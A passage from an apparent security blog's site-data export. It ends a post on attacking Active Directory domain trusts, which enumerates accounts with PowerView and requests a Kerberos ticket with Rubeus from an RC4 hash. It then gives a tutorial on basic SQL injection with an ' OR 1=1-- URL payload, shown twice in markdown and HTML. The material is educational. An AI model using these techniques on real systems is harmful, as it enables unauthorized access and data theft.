scenario, there are users called “trust users”, which are essentially trusted accounts that have the ability to access resources over the domain trust. While the domain trust is outbound, the trusted domain still requires a trust user to use in order to properly access our domain’s resources. This same trust user is present on the trusted domain, which we now have a hash for. We can discover valid trust users with another <code>PowerView</code> cmdlet, you can find an example of what you might see below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainUser -Identity * -Properties DisplayName, MemberOf | fl</span><br><span class=\"line\"></span><br><span class=\"line\">displayname : DAN</span><br><span class=\"line\">memberof    : &#123;CN=Pro Users,CN=Users,DC=dan-feliciano,DC=pro&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>You can also use tools such as <code>ADSearch --search &quot;(objectCategory=user)&quot;</code> to discover valid machine accounts. Just for simplicities sake, we’ll stick with <code>PowerView</code>.</li>\n</ul>\n<p>This essentially tells us that there could be a valid trust account named <code>DAN$</code> amongst the <code>dan-feliciano.pro</code> domain.  Although we aren’t able to confirm this since we can’t access the any domain resources in the trusted domain, we can still attempt to try and determine if this is the right account. This is what makes this process semi-trivial, as we’re essentially guessing whether or not this is a valid trust account.</p>\n<p>We can use a tool called <code>Rubeus</code> to create a valid service ticket for the <code>DAN$</code> account. Rubeus is toolset that is used for Kerberos interaction and exploits, and it will assist in us being able to create TGTs and TGSs that we’ll need in order to access the foreign domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; .\\Rubeus.exe asktgt /user:DAN$ /domain:dan-feliciano.pro /rc4:e1087fb17c8e5b4f29c4e1c0cb161481 /nowrap</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Action: Ask TGT</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using rc4_hmac hash: e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class=\"line\">[*] Building AS-REQ (w/ preauth) for: &#x27;dan-feliciano.pro\\DAN$&#x27;</span><br><span class=\"line\">[*] Using domain controller: (DOMAIN CONTROLLER IP)</span><br><span class=\"line\">[+] TGT request successful!</span><br><span class=\"line\">[*] base64(ticket.kirbi):</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tdoIHrK[...snip...]Yit98s</span><br></pre></td></tr></table></figure>\n\n<p>This will return a TGT that we can now use on the remote domain, which can be used in a variety of situations. You can enumerate potential vectors with this TGT with tools such as <code>PowerSploit</code> or <code>ADSearch</code>. In some situations, we may be dealing with attacks such as constrained&#x2F;unconstrained delegation, Kerberoasting, ASREPRoasting, or even ADCS. I look forward to creating future posts regarding these exploits in the future.</p>\n<h1 id=\"Bidirectional-Trusts\"><a href=\"#Bidirectional-Trusts\" class=\"headerlink\" title=\"Bidirectional Trusts\"></a>Bidirectional Trusts</h1><p>I don’t plan on going specifically into an attack vector for <code>bidirectional</code> trust attacks, since you can essentially perform either of the trust attacks that were listed for inbound&#x2F;outbound as explained above. I do however want to explain a few of the methods that can be used for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Import-Module .\\PowerView.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainTrust</span><br><span class=\"line\"></span><br><span class=\"line\">SourceName      : dan-feliciano.dev</span><br><span class=\"line\">TargetName      : dan-feliciano.pro</span><br><span class=\"line\">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class=\"line\">TrustAttributes : </span><br><span class=\"line\">TrustDirection  : Bidirectional</span><br><span class=\"line\">WhenCreated     : 5/9/2024 10:28:52 PM</span><br><span class=\"line\">WhenChanged     : 5/9/2024 10:28:52 PM</span><br></pre></td></tr></table></figure>\n\n<p>Essentially this will tell us that both domains trust one another, and that both domains have access to each other’s resources. We can perform a variety of attacks as explained above, or we can create <code>Golden</code> or <code>Diamond</code> tickets used to access each of the domains.</p>\n<p>If we are a domain admin or have DA privileges in the child domain, this tells us that we also have DA privileges in the parent domain. This is through the idea of SID History, which (at a basic-level) causes the domains to share SIDs amongst the domain trust. The SID of the DA account we have access to will be inherited in the parent domain due to the bidirectional relationship.</p>\n<p>That’s essentially where <code>Golden</code> and <code>Diamond</code> tickets come into play, however I plan on leaving those for another post as I explained earlier. Domain dominance is a really interesting topic, and I am looking forward to researching more into it.</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to RastaMouse and r0bit for getting me into this given the material that I’ve learned from. I encourage you all to progress through machines and chains on <code>Vulnlab</code>, as they really help with understanding Active Directory and Linux exploits; as well as just general red-team thinking.</p>\n<p><strong>Resources Used</strong></p>\n<ul>\n<li><a href=\"https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust\">https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust</a></li>\n<li><a href=\"https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d\">https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d</a></li>\n<li><a href=\"https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains\">https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains</a></li>\n<li><a href=\"https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets\">https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets</a></li>\n<li><a href=\"https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-\">https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-</a>*</li>\n</ul>\n"},{"title":"SQLi Basics","date":"2024-06-06T02:52:25.000Z","keywords":"research, Web Applications, exploits","description":"I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https://dan-feliciano.com/writeups/trusted/) (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you'll see in the images to follow.","cover":"/images/research/sqli-basics/sqli.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nSQL Injection is a web security vulnerability that essentially allows an attacker to maliciously query a database through an input form. Otherwise known as SQLi, SQL injection thus can allow the attacker to view data from within an SQL database that they would normally should not be able to view.\n\n# Introduction\n\nWhen I was progressing through my research into exploits, I came across various different forms of SQL injections and how they specifically affect the web services from where they are hosted. While they can vary from web application to web application, the practicality of the information you are attempting to retrieve is generally the same. In many cases, we are hoping to reveal information about databases, following that are tables, and finally following that are entries.\n\nBut that being said, what exact information are we actually trying to receive? For pen-tests or red teaming activities, there are different assets that we can find that can allow us to access other services. For threat actors and TTPs, some of the assets to be compromised are the same. The only difference is that those same threat actors are using this information to compromise pertinent user data with the intent to produce a negative effect on the organization.\n\nIn most cases, these affect databases that are directly connected to a web form where the input form originates. Their input can me modified in order to query the entirety of a database, specific tables, or specific entries where data is housed.\n\n![](/images/research/sqli-basics/b.png)\n\nIn order for a web-application to retrieve information from a database, it generally needs to utilize some query to retrieve contents from a specific part of the database. This can be utilized in use cases such as matching the input with valid contents in the database or in a search parameter to provide similar content names of a field search. \n\n# Input Methodology\n\nThe general methodology to SQLi is that certain SQL characters such as `;` or `'` can cause the input to be split. While these can cause errors in the SQL statement altogether, they can also cause SQL database contents to be leaked to the client navigating to the website.\n\nIn most cases aside from data exfiltration, attackers can use SQLi to compromise the entirety of an underlying server or the back-end of the server itself (or even web-service attacks such as Denial-of-Service).\n\nNow how does this exactly occur? Well, in most cases, SQLi occurs within the `WHERE` statement of a `SELECT` query, which is the specific part of the query that is attempting to retrieve data from a database. That being said, it can also occur in other locations that host different queries. This can be found in:\n\n* `SELECT` and `ORDER BY` clauses.\n* `INSERT` and subsequent inserted variables.\n* `SELECT` statements that reside within a specific table or column.\n* `UPDATE` calls, which the values are interchanged within a `WHERE` clause.\n* `UNION SELECT` statements, which collect a group of data.\n\nThe list can go on and on. In most cases, these all require general knowledge of specifically how the request is being handled before it is sent to the backend SQL database. When we are attempting to understand the query being used, we need to ask ourselves a few questions.\n\n* Is the application handling data from a specific database that retrieves hidden data?\n* While we may not be able to receive an output, can we produce a valid request using a wildcard? (Blind SQLi)\n* Is the query allowing us to select multiple categories or tables? (UNION SELECT attacks)\n\nWe'll take a look at more in-depth SQLi attacks in the future, such as Blind SQLi or UNION select attacks. For this specific post we'll focus on basic SQLi methodology.\n\n# Basic Example SQLi\n\nLet's say for instance we have access to a website with the following URL parameter. This was accessed by clicking on the only hyperlink on the page, which gave us an output of the entries that we have access to below (Note that this website section does not actually exist on this webpage).\n\n> `http://dan-feliciano.com/section?entry_name=red`\n\n* This results in the following sentence being output to the website page in a notepad-like format.\n\n```\nEntries for RED.\n\nEntry 1 - RED\nEntry 2 - RED\n```\n\n* On the backend, the SQL table `COLORS` is the table that is being used for data on this webpage. An example table is provided below to illustrate what this could look like.*\n\n| TABLE: COLORS | entry_color | id  | available |\n| ------------- | ----------- | --- | --------- |\n| Entry 1       | RED         | 1   | 1         |\n| Entry 2       | RED         | 2   | 1         |\n| Entry 3       | BLUE        | 3   | 1         |\n| Entry 4       | BLUE        | 4   | 1         |\n| Entry 5       | YELLOW      | 5   | 0         |\n| Entry 6       | YELLOW      | 6   | 0         |\n| Entry 7       | RED         | 7   | 0         |\n\n* In order to receive this specific entry, a query will be sent to the database in order to retrieve the data in that entry. The SQL query that is sent to the database in our case is the following:\n\n```\nSELECT * FROM sections WHERE entry_color = 'RED' AND available = '1'\n```\n\nThis SQL query consists of the following data (to which the database will interpret):\n\n* `SELECT * FROM sections` will select all column/row entries from the `sections` table.\n* `WHERE entry_color = 'RED'` is the first argument, saying to only output entries within the `entry_name` column with the entry value 'RED'.\n* `AND available = 1` is another argument that says to also only include entries with an `available` value of 1.\n\nIf we put all of this together based on the table that was provided based on the backend above, then the entry that will be given to us are `Entries 1 and 2`. To keep in-line with the example, let's say that we're unable to access any other parameters by just editing the URL and retrieving the other parameters. The only space we have access to is this webpage with static entries.\n\nThe main bar in our specific situation is the `available` value. As you may have noticed, the query that is being sent to the database will only return entries that have an `available` value of 1. This means that all values that are output to the webpage from the database will only include `Entries 1 and 2` and will NOT include `Entry 7`. The other entries are also barred from the output since they do not include an `entry_color` value of 'RED'.\n\nIn order to circumvent this in a basic scenario, we could construct an input into the URL parameter to exploit this simple weakness and exfil not just `Entry 7`, but all entries as a result.\n\n>`http://dan-feliciano.com/section?entry_name=red'+OR+1=1--`\n\nIn this entry, we are essentially saying that we want all entries with an `entry_name` of 'RED' - OR we would all entries where `1=1`, which is always true.\n\n```\nSELECT * FROM sections WHERE entry_color = 'RED' AND available = '1' OR 1=1\n```\n\nDue to the conditional `OR` statement being fulfilled, the `SELECT` query will instead return all of the entries. `SELECT * FROM sections`\n\n```\nEntries for RED.\n\nEntry 1 - RED\nEntry 2 - RED\nEntry 3 - BLUE\nEntry 4 - BLUE\nEntry 5 - YELLOW\nEntry 6 - YELLOW\nEntry 7 - RED\n```\n\nAs denoted above, this has returned all of the entries and we have successfully exploited the SQLi vulnerability.\n\nBe wary of issues as these, as in some cases our queries may come into contact with a `DELETE` or an `UPDATE` statement, meaning that they could accidentally delete or alter data. It's important to take into consideration what the result of our query will do, as we want to circumvent harmful changes like these. When red-teaming, ensure that you understand the queries that will be sent to the database and that you keep as low of a profile as possible.\n\nBig thanks to PortSwigger (the creators of Burpsuite), as this post was inspired by the documentation they have as I continue to progress through all of their web-app labs.\n\n![](/images/research/sqli-basics/c.png)\n\nThis was a practice web-page implementation on what I'd like to see in my research. I expect to research more into SQLi and other web-application attacks in the future.\n\n# Resources\n\nhttps://portswigger.net/web-security/sql-injection\nhttps://owasp.org/www-community/attacks/SQL_Injection\nhttps://www.imperva.com/learn/application-security/sql-injection-sqli/\n\n","source":"_posts/sqli-basics.md","raw":"---\ntitle: SQLi Basics\ndate: 2024-06-05 22:52:25\ntags: [research, Web Applications]\ncategories: research\nkeywords: 'research, Web Applications, exploits'\ndescription: I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https://dan-feliciano.com/writeups/trusted/) (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you'll see in the images to follow.\ncover: /images/research/sqli-basics/sqli.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nSQL Injection is a web security vulnerability that essentially allows an attacker to maliciously query a database through an input form. Otherwise known as SQLi, SQL injection thus can allow the attacker to view data from within an SQL database that they would normally should not be able to view.\n\n# Introduction\n\nWhen I was progressing through my research into exploits, I came across various different forms of SQL injections and how they specifically affect the web services from where they are hosted. While they can vary from web application to web application, the practicality of the information you are attempting to retrieve is generally the same. In many cases, we are hoping to reveal information about databases, following that are tables, and finally following that are entries.\n\nBut that being said, what exact information are we actually trying to receive? For pen-tests or red teaming activities, there are different assets that we can find that can allow us to access other services. For threat actors and TTPs, some of the assets to be compromised are the same. The only difference is that those same threat actors are using this information to compromise pertinent user data with the intent to produce a negative effect on the organization.\n\nIn most cases, these affect databases that are directly connected to a web form where the input form originates. Their input can me modified in order to query the entirety of a database, specific tables, or specific entries where data is housed.\n\n![](/images/research/sqli-basics/b.png)\n\nIn order for a web-application to retrieve information from a database, it generally needs to utilize some query to retrieve contents from a specific part of the database. This can be utilized in use cases such as matching the input with valid contents in the database or in a search parameter to provide similar content names of a field search. \n\n# Input Methodology\n\nThe general methodology to SQLi is that certain SQL characters such as `;` or `'` can cause the input to be split. While these can cause errors in the SQL statement altogether, they can also cause SQL database contents to be leaked to the client navigating to the website.\n\nIn most cases aside from data exfiltration, attackers can use SQLi to compromise the entirety of an underlying server or the back-end of the server itself (or even web-service attacks such as Denial-of-Service).\n\nNow how does this exactly occur? Well, in most cases, SQLi occurs within the `WHERE` statement of a `SELECT` query, which is the specific part of the query that is attempting to retrieve data from a database. That being said, it can also occur in other locations that host different queries. This can be found in:\n\n* `SELECT` and `ORDER BY` clauses.\n* `INSERT` and subsequent inserted variables.\n* `SELECT` statements that reside within a specific table or column.\n* `UPDATE` calls, which the values are interchanged within a `WHERE` clause.\n* `UNION SELECT` statements, which collect a group of data.\n\nThe list can go on and on. In most cases, these all require general knowledge of specifically how the request is being handled before it is sent to the backend SQL database. When we are attempting to understand the query being used, we need to ask ourselves a few questions.\n\n* Is the application handling data from a specific database that retrieves hidden data?\n* While we may not be able to receive an output, can we produce a valid request using a wildcard? (Blind SQLi)\n* Is the query allowing us to select multiple categories or tables? (UNION SELECT attacks)\n\nWe'll take a look at more in-depth SQLi attacks in the future, such as Blind SQLi or UNION select attacks. For this specific post we'll focus on basic SQLi methodology.\n\n# Basic Example SQLi\n\nLet's say for instance we have access to a website with the following URL parameter. This was accessed by clicking on the only hyperlink on the page, which gave us an output of the entries that we have access to below (Note that this website section does not actually exist on this webpage).\n\n> `http://dan-feliciano.com/section?entry_name=red`\n\n* This results in the following sentence being output to the website page in a notepad-like format.\n\n```\nEntries for RED.\n\nEntry 1 - RED\nEntry 2 - RED\n```\n\n* On the backend, the SQL table `COLORS` is the table that is being used for data on this webpage. An example table is provided below to illustrate what this could look like.*\n\n| TABLE: COLORS | entry_color | id  | available |\n| ------------- | ----------- | --- | --------- |\n| Entry 1       | RED         | 1   | 1         |\n| Entry 2       | RED         | 2   | 1         |\n| Entry 3       | BLUE        | 3   | 1         |\n| Entry 4       | BLUE        | 4   | 1         |\n| Entry 5       | YELLOW      | 5   | 0         |\n| Entry 6       | YELLOW      | 6   | 0         |\n| Entry 7       | RED         | 7   | 0         |\n\n* In order to receive this specific entry, a query will be sent to the database in order to retrieve the data in that entry. The SQL query that is sent to the database in our case is the following:\n\n```\nSELECT * FROM sections WHERE entry_color = 'RED' AND available = '1'\n```\n\nThis SQL query consists of the following data (to which the database will interpret):\n\n* `SELECT * FROM sections` will select all column/row entries from the `sections` table.\n* `WHERE entry_color = 'RED'` is the first argument, saying to only output entries within the `entry_name` column with the entry value 'RED'.\n* `AND available = 1` is another argument that says to also only include entries with an `available` value of 1.\n\nIf we put all of this together based on the table that was provided based on the backend above, then the entry that will be given to us are `Entries 1 and 2`. To keep in-line with the example, let's say that we're unable to access any other parameters by just editing the URL and retrieving the other parameters. The only space we have access to is this webpage with static entries.\n\nThe main bar in our specific situation is the `available` value. As you may have noticed, the query that is being sent to the database will only return entries that have an `available` value of 1. This means that all values that are output to the webpage from the database will only include `Entries 1 and 2` and will NOT include `Entry 7`. The other entries are also barred from the output since they do not include an `entry_color` value of 'RED'.\n\nIn order to circumvent this in a basic scenario, we could construct an input into the URL parameter to exploit this simple weakness and exfil not just `Entry 7`, but all entries as a result.\n\n>`http://dan-feliciano.com/section?entry_name=red'+OR+1=1--`\n\nIn this entry, we are essentially saying that we want all entries with an `entry_name` of 'RED' - OR we would all entries where `1=1`, which is always true.\n\n```\nSELECT * FROM sections WHERE entry_color = 'RED' AND available = '1' OR 1=1\n```\n\nDue to the conditional `OR` statement being fulfilled, the `SELECT` query will instead return all of the entries. `SELECT * FROM sections`\n\n```\nEntries for RED.\n\nEntry 1 - RED\nEntry 2 - RED\nEntry 3 - BLUE\nEntry 4 - BLUE\nEntry 5 - YELLOW\nEntry 6 - YELLOW\nEntry 7 - RED\n```\n\nAs denoted above, this has returned all of the entries and we have successfully exploited the SQLi vulnerability.\n\nBe wary of issues as these, as in some cases our queries may come into contact with a `DELETE` or an `UPDATE` statement, meaning that they could accidentally delete or alter data. It's important to take into consideration what the result of our query will do, as we want to circumvent harmful changes like these. When red-teaming, ensure that you understand the queries that will be sent to the database and that you keep as low of a profile as possible.\n\nBig thanks to PortSwigger (the creators of Burpsuite), as this post was inspired by the documentation they have as I continue to progress through all of their web-app labs.\n\n![](/images/research/sqli-basics/c.png)\n\nThis was a practice web-page implementation on what I'd like to see in my research. I expect to research more into SQLi and other web-application attacks in the future.\n\n# Resources\n\nhttps://portswigger.net/web-security/sql-injection\nhttps://owasp.org/www-community/attacks/SQL_Injection\nhttps://www.imperva.com/learn/application-security/sql-injection-sqli/\n\n","slug":"sqli-basics","published":1,"updated":"2024-06-06T03:02:57.432Z","_id":"clx2o5x710000hpuf1vk37qeq","comments":1,"layout":"post","photos":[],"content":"<p>SQL Injection is a web security vulnerability that essentially allows an attacker to maliciously query a database through an input form. Otherwise known as SQLi, SQL injection thus can allow the attacker to view data from within an SQL database that they would normally should not be able to view.</p>\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>When I was progressing through my research into exploits, I came across various different forms of SQL injections and how they specifically affect the web services from where they are hosted. While they can vary from web application to web application, the practicality of the information you are attempting to retrieve is generally the same. In many cases, we are hoping to reveal information about databases, following that are tables, and finally following that are entries.</p>\n<p>But that being said, what exact information are we actually trying to receive? For pen-tests or red teaming activities, there are different assets that we can find that can allow us to access other services. For threat actors and TTPs, some of the assets to be compromised are the same. The only difference is that those same threat actors are using this information to compromise pertinent user data with the intent to produce a negative effect on the organization.</p>\n<p>In most cases, these affect databases that are directly connected to a web form where the input form originates. Their input can me modified in order to query the entirety of a database, specific tables, or specific entries where data is housed.</p>\n<p><img src=\"/images/research/sqli-basics/b.png\"></p>\n<p>In order for a web-application to retrieve information from a database, it generally needs to utilize some query to retrieve contents from a specific part of the database. This can be utilized in use cases such as matching the input with valid contents in the database or in a search parameter to provide similar content names of a field search. </p>\n<h1 id=\"Input-Methodology\"><a href=\"#Input-Methodology\" class=\"headerlink\" title=\"Input Methodology\"></a>Input Methodology</h1><p>The general methodology to SQLi is that certain SQL characters such as <code>;</code> or <code>&#39;</code> can cause the input to be split. While these can cause errors in the SQL statement altogether, they can also cause SQL database contents to be leaked to the client navigating to the website.</p>\n<p>In most cases aside from data exfiltration, attackers can use SQLi to compromise the entirety of an underlying server or the back-end of the server itself (or even web-service attacks such as Denial-of-Service).</p>\n<p>Now how does this exactly occur? Well, in most cases, SQLi occurs within the <code>WHERE</code> statement of a <code>SELECT</code> query, which is the specific part of the query that is attempting to retrieve data from a database. That being said, it can also occur in other locations that host different queries. This can be found in:</p>\n<ul>\n<li><code>SELECT</code> and <code>ORDER BY</code> clauses.</li>\n<li><code>INSERT</code> and subsequent inserted variables.</li>\n<li><code>SELECT</code> statements that reside within a specific table or column.</li>\n<li><code>UPDATE</code> calls, which the values are interchanged within a <code>WHERE</code> clause.</li>\n<li><code>UNION SELECT</code> statements, which collect a group of data.</li>\n</ul>\n<p>The list can go on and on. In most cases, these all require general knowledge of specifically how the request is being handled before it is sent to the backend SQL database. When we are attempting to understand the query being used, we need to ask ourselves a few questions.</p>\n<ul>\n<li>Is the application handling data from a specific database that retrieves hidden data?</li>\n<li>While we may not be able to receive an output, can we produce a valid request using a wildcard? (Blind SQLi)</li>\n<li>Is the query allowing us to select multiple categories or tables? (UNION SELECT attacks)</li>\n</ul>\n<p>We’ll take a look at more in-depth SQLi attacks in the future, such as Blind SQLi or UNION select attacks. For this specific post we’ll focus on basic SQLi methodology.</p>\n<h1 id=\"Basic-Example-SQLi\"><a href=\"#Basic-Example-SQLi\" class=\"headerlink\" title=\"Basic Example SQLi\"></a>Basic Example SQLi</h1><p>Let’s say for instance we have access to a website with the following URL parameter. This was accessed by clicking on the only hyperlink on the page, which gave us an output of the entries that we have access to below (Note that this website section does not actually exist on this webpage).</p>\n<blockquote>\n<p><code>http://dan-feliciano.com/section?entry_name=red</code></p>\n</blockquote>\n<ul>\n<li>This results in the following sentence being output to the website page in a notepad-like format.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Entries for RED.</span><br><span class=\"line\"></span><br><span class=\"line\">Entry 1 - RED</span><br><span class=\"line\">Entry 2 - RED</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>On the backend, the SQL table <code>COLORS</code> is the table that is being used for data on this webpage. An example table is provided below to illustrate what this could look like.*</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>TABLE: COLORS</th>\n<th>entry_color</th>\n<th>id</th>\n<th>available</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Entry 1</td>\n<td>RED</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 2</td>\n<td>RED</td>\n<td>2</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 3</td>\n<td>BLUE</td>\n<td>3</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 4</td>\n<td>BLUE</td>\n<td>4</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 5</td>\n<td>YELLOW</td>\n<td>5</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Entry 6</td>\n<td>YELLOW</td>\n<td>6</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Entry 7</td>\n<td>RED</td>\n<td>7</td>\n<td>0</td>\n</tr>\n</tbody></table>\n<ul>\n<li>In order to receive this specific entry, a query will be sent to the database in order to retrieve the data in that entry. The SQL query that is sent to the database in our case is the following:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM sections WHERE entry_color = &#x27;RED&#x27; AND available = &#x27;1&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>This SQL query consists of the following data (to which the database will interpret):</p>\n<ul>\n<li><code>SELECT * FROM sections</code> will select all column&#x2F;row entries from the <code>sections</code> table.</li>\n<li><code>WHERE entry_color = &#39;RED&#39;</code> is the first argument, saying to only output entries within the <code>entry_name</code> column with the entry value ‘RED’.</li>\n<li><code>AND available = 1</code> is another argument that says to also only include entries with an <code>available</code> value of 1.</li>\n</ul>\n<p>If we put all of this together based on the table that was provided based on the backend above, then the entry that will be given to us are <code>Entries 1 and 2</code>. To keep in-line with the example, let’s say that we’re unable to access any other parameters by just editing the URL and retrieving the other parameters. The only space we have access to is this webpage with static entries.</p>\n<p>The main bar in our specific situation is the <code>available</code> value. As you may have noticed, the query that is being sent to the database will only return entries that have an <code>available</code> value of 1. This means that all values that are output to the webpage from the database will only include <code>Entries 1 and 2</code> and will NOT include <code>Entry 7</code>. The other entries are also barred from the output since they do not include an <code>entry_color</code> value of ‘RED’.</p>\n<p>In order to circumvent this in a basic scenario, we could construct an input into the URL parameter to exploit this simple weakness and exfil not just <code>Entry 7</code>, but all entries as a result.</p>\n<blockquote>\n<p><code>http://dan-feliciano.com/section?entry_name=red&#39;+OR+1=1--</code></p>\n</blockquote>\n<p>In this entry, we are essentially saying that we want all entries with an <code>entry_name</code> of ‘RED’ - OR we would all entries where <code>1=1</code>, which is always true.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM sections WHERE entry_color = &#x27;RED&#x27; AND available = &#x27;1&#x27; OR 1=1</span><br></pre></td></tr></table></figure>\n\n<p>Due to the conditional <code>OR</code> statement being fulfilled, the <code>SELECT</code> query will instead return all of the entries. <code>SELECT * FROM sections</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Entries for RED.</span><br><span class=\"line\"></span><br><span class=\"line\">Entry 1 - RED</span><br><span class=\"line\">Entry 2 - RED</span><br><span class=\"line\">Entry 3 - BLUE</span><br><span class=\"line\">Entry 4 - BLUE</span><br><span class=\"line\">Entry 5 - YELLOW</span><br><span class=\"line\">Entry 6 - YELLOW</span><br><span class=\"line\">Entry 7 - RED</span><br></pre></td></tr></table></figure>\n\n<p>As denoted above, this has returned all of the entries and we have successfully exploited the SQLi vulnerability.</p>\n<p>Be wary of issues as these, as in some cases our queries may come into contact with a <code>DELETE</code> or an <code>UPDATE</code> statement, meaning that they could accidentally delete or alter data. It’s important to take into consideration what the result of our query will do, as we want to circumvent harmful changes like these. When red-teaming, ensure that you understand the queries that will be sent to the database and that you keep as low of a profile as possible.</p>\n<p>Big thanks to PortSwigger (the creators of Burpsuite), as this post was inspired by the documentation they have as I continue to progress through all of their web-app labs.</p>\n<p><img src=\"/images/research/sqli-basics/c.png\"></p>\n<p>This was a practice web-page implementation on what I’d like to see in my research. I expect to research more into SQLi and other web-application attacks in the future.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://portswigger.net/web-security/sql-injection\">https://portswigger.net/web-security/sql-injection</a><br><a href=\"https://owasp.org/www-community/attacks/SQL_Injection\">https://owasp.org/www-community/attacks/SQL_Injection</a><br><a href=\"https://www.imperva.com/learn/application-security/sql-injection-sqli/\">https://www.imperva.com/learn/application-security/sql-injection-sqli/</a></p>\n","cover_type":"img","excerpt":"","more":"<p>SQL Injection is a web security vulnerability that essentially allows an attacker to maliciously query a database through an input form. Otherwise known as SQLi, SQL injection thus can allow the attacker to view data from within an SQL database that they would normally should not be able to view.</p>\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>When I was progressing through my research into exploits, I came across various different forms of SQL injections and how they specifically affect the web services from where they are hosted. While they can vary from web application to web application, the practicality of the information you are attempting to retrieve is generally the same. In many cases, we are hoping to reveal information about databases, following that are tables, and finally following that are entries.</p>\n<p>But that being said, what exact information are we actually trying to receive? For pen-tests or red teaming activities, there are different assets that we can find that can allow us to access other services. For threat actors and TTPs, some of the assets to be compromised are the same. The only difference is that those same threat actors are using this information to compromise pertinent user data with the intent to produce a negative effect on the organization.</p>\n<p>In most cases, these affect databases that are directly connected to a web form where the input form originates. Their input can me modified in order to query the entirety of a database, specific tables, or specific entries where data is housed.</p>\n<p><img src=\"/images/research/sqli-basics/b.png\"></p>\n<p>In order for a web-application to retrieve information from a database, it generally needs to utilize some query to retrieve contents from a specific part of the database. This can be utilized in use cases such as matching the input with valid contents in the database or in a search parameter to provide similar content names of a field search. </p>\n<h1 id=\"Input-Methodology\"><a href=\"#Input-Methodology\" class=\"headerlink\" title=\"Input Methodology\"></a>Input Methodology</h1><p>The general methodology to SQLi is that certain SQL characters such as <code>;</code> or <code>&#39;</code> can cause the input to be split. While these can cause errors in the SQL statement altogether, they can also cause SQL database contents to be leaked to the client navigating to the website.</p>\n<p>In most cases aside from data exfiltration, attackers can use SQLi to compromise the entirety of an underlying server or the back-end of the server itself (or even web-service attacks such as Denial-of-Service).</p>\n<p>Now how does this exactly occur? Well, in most cases, SQLi occurs within the <code>WHERE</code> statement of a <code>SELECT</code> query, which is the specific part of the query that is attempting to retrieve data from a database. That being said, it can also occur in other locations that host different queries. This can be found in:</p>\n<ul>\n<li><code>SELECT</code> and <code>ORDER BY</code> clauses.</li>\n<li><code>INSERT</code> and subsequent inserted variables.</li>\n<li><code>SELECT</code> statements that reside within a specific table or column.</li>\n<li><code>UPDATE</code> calls, which the values are interchanged within a <code>WHERE</code> clause.</li>\n<li><code>UNION SELECT</code> statements, which collect a group of data.</li>\n</ul>\n<p>The list can go on and on. In most cases, these all require general knowledge of specifically how the request is being handled before it is sent to the backend SQL database. When we are attempting to understand the query being used, we need to ask ourselves a few questions.</p>\n<ul>\n<li>Is the application handling data from a specific database that retrieves hidden data?</li>\n<li>While we may not be able to receive an output, can we produce a valid request using a wildcard? (Blind SQLi)</li>\n<li>Is the query allowing us to select multiple categories or tables? (UNION SELECT attacks)</li>\n</ul>\n<p>We’ll take a look at more in-depth SQLi attacks in the future, such as Blind SQLi or UNION select attacks. For this specific post we’ll focus on basic SQLi methodology.</p>\n<h1 id=\"Basic-Example-SQLi\"><a href=\"#Basic-Example-SQLi\" class=\"headerlink\" title=\"Basic Example SQLi\"></a>Basic Example 